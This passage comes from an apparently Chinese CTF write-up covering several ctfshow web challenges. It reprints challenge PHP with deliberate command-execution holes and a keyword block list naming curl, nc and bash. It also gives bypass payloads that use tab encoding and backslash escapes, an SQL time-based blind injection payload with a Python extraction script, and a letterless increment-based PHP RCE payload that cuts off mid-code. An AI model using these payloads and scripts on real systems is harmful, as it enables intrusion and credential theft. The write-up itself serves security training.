class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;more&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tail&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;less&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;head&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tac&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;sort&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>空格过滤拿%09去绕过</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">get_flag</span>=ls%<span class="number">09</span>/</span><br><span class="line"><span class="attr">get_flag</span>=nl%<span class="number">09</span>/*</span><br></pre></td></tr></table></figure>

<p>之前做过一个nl的特性，直接把根目录下的flag的内容爆出来了</p>
<p><img src="/../image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250516133116761.png" alt="image-20250516133116761"></p>
<h2 id="WUSTCTF-朴实无华-Revenge-Revenge"><a href="#WUSTCTF-朴实无华-Revenge-Revenge" class="headerlink" title="WUSTCTF_朴实无华_Revenge_Revenge"></a>WUSTCTF_朴实无华_Revenge_Revenge</h2><p>挨个看</p>
<h3 id="level-1-1"><a href="#level-1-1" class="headerlink" title="level 1"></a>level 1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$len</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$l</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$k</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$len</span>/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="variable">$k</span>;<span class="variable">$j</span>++)</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="variable">$j</span>,<span class="number">1</span>)!=<span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="variable">$len</span>-<span class="variable">$j</span>-<span class="number">1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="variable">$l</span>=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$l</span>==<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="variable">$numPositve</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$numReverse</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$num</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^0-9.]/&#x27;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非洲欢迎你1&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/\./&quot;</span>, <span class="variable">$num</span>) &gt; <span class="number">1</span>) || (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/\-/&quot;</span>, <span class="variable">$num</span>) &gt; <span class="number">1</span>) || (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/\-/&quot;</span>, <span class="variable">$num</span>)==<span class="number">1</span> &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[-]/&#x27;</span>, <span class="variable">$num</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;没有这样的数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="variable">$numPositve</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$numPositve</span> &lt;= -<span class="number">999999999999999999</span> || <span class="variable">$numPositve</span> &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非洲欢迎你2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$numPositve</span> === <span class="variable">$numReverse</span> &amp;&amp; !<span class="title function_ invoke__">isPalindrome</span>(<span class="variable">$num</span>) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次不能用-号了，并且转化成整数后的数要等于原数据，那就用0.00吧</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">num</span>=0.00</span><br></pre></td></tr></table></figure>

<h3 id="level-2-1"><a href="#level-2-1" class="headerlink" title="level 2"></a>level 2</h3><p>没啥变化，之前的也可以打</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="attribute">md5</span>=0e1138100474</span><br></pre></td></tr></table></figure>

<h3 id="level-3-1"><a href="#level-3-1" class="headerlink" title="level 3"></a>level 3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;more&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tail&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;less&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;head&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tac&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;sort&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;nl&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[&#x27;\*\&quot;[?]/&quot;</span>, <span class="variable">$get_flag</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;非预期修复*2&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>过滤了之前nl的做法，那我们反斜杠绕过关键字就行</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;get_flag<span class="operator">=</span>ta\<span class="keyword">c</span><span class="variable">%09</span>flag.ph\p</span><br></pre></td></tr></table></figure>

<h2 id="Login-Only-For-36D"><a href="#Login-Only-For-36D" class="headerlink" title="Login_Only_For_36D"></a>Login_Only_For_36D</h2><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="#时间盲注"></a>#时间盲注</h3><p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219202259005.png" alt="image-20241219202259005"></p>
<p>登录界面，我们先输入两个1看看</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219202330531.png" alt="image-20241219202330531"></p>
<p>试一下admin’和1，回显hacker，应该是<code>&#39;</code>单引号被过滤了，那就测试一下，发现空格，等于号，and，or，ascii，substr，select，union都被过滤了，sleep，ord，#，if没被过滤，那我们考虑一下时间盲注</p>
<p>猜测一下查询语句</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line"><span class="comment">&lt;!-- if (!preg_match(&#x27;/admin/&#x27;, $uname)) die; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- select * from 36d_user where username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27;; --&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤了引号，但是还有注释符可用，可以用\将单引号转义</p>
<p>payload</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span>=admin\&amp;password=or(sleep(<span class="number">5</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>admin\</code>把单引号注释掉让后面$passwd逃逸出去，然后可以发现延迟了5s，确认存在时间盲注，那我们上脚本，因为我们知道了账号是admin，所以我们打password就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fcc116b3-6180-4c33-8def-a29981cbe059.challenge.ctf.show/index.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span> : <span class="string">&quot;admin\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        payload = <span class="string">&#x27;or/**/if((password/**/regexp/**/binary/**/&quot;^&#123;&#125;&quot;),sleep(5),1)#&#x27;</span>.<span class="built_in">format</span>(result+char)</span><br><span class="line">        data[<span class="string">&#x27;password&#x27;</span>] = payload</span><br><span class="line">        time1 = datetime.datetime.now()</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        time2 = datetime.datetime.now()</span><br><span class="line">        sec = (time2 - time1).seconds</span><br><span class="line">        <span class="keyword">if</span> sec &gt;= <span class="number">5</span>:<span class="comment">#超时时间为5秒</span></span><br><span class="line">            result += char</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解释一下payload哈</p>
<h3 id="regexp-binary正则匹配"><a href="#regexp-binary正则匹配" class="headerlink" title="regexp binary正则匹配"></a>regexp binary正则匹配</h3><p>空格用<code>/**/</code>去绕过，然后<code>password regexp binary &quot;^&#123;&#125;&quot;</code> 是一个正则表达式匹配操作，它尝试匹配数据库中的 password 字段的值是否与指定的模式 <code>^&#123;&#125;(任意字符)</code> 匹配。</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219225610042.png" alt="image-20241219225610042"></p>
<p>这个就是我们的password</p>
<h2 id="你取吧"><a href="#你取吧" class="headerlink" title="你取吧"></a>你取吧</h2><h3 id="自增无字母RCE"><a href="#自增无字母RCE" class="headerlink" title="#自增无字母RCE"></a>#自增无字母RCE</h3><p>代码审计题目</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$hint</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=hhh.php&#x27;</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="variable">$_</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>);</span><br><span class="line"><span class="variable">$blacklist</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blacklisted</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span> (<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blacklisted</span> . <span class="string">&#x27;/im&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$code</span>);&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>无字母无数字rce，这里把取反和异或符号都去掉了，显而易见这里可以用自增去进行rce</p>
<p>那就写呗</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span 